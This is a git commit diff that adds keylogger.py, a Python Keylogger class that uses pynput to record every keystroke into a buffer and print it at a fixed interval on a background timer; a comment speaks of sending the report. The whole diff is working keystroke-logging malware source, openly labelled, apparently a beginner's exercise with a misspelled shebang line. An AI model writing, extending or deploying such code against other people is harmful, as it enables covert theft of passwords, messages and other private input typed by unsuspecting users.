dd9c5e52d9e1a8419829f4287ac1c98392267b34
andrei-macovei <armacovei@gmail.com>
2023-08-30 11:04:31 -0400

    Implemented Keylogger class

---
+++ keylogger.py
@@ -0,0 +1,36 @@
+#!/usr/in/env pyhton
+
+import pynput
+import threading
+
+
+class Keylogger:
+    def __init__(self, time_interval):
+        self.log = "Keylogger started\n"
+        self.interval = time_interval
+
+    def append_to_log(self, string):
+        self.log = self.log + string
+
+    def process_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
+
+    def report(self):
+        print(self.log)
+        self.log = ""
+        # using another thread to send report
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
+
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
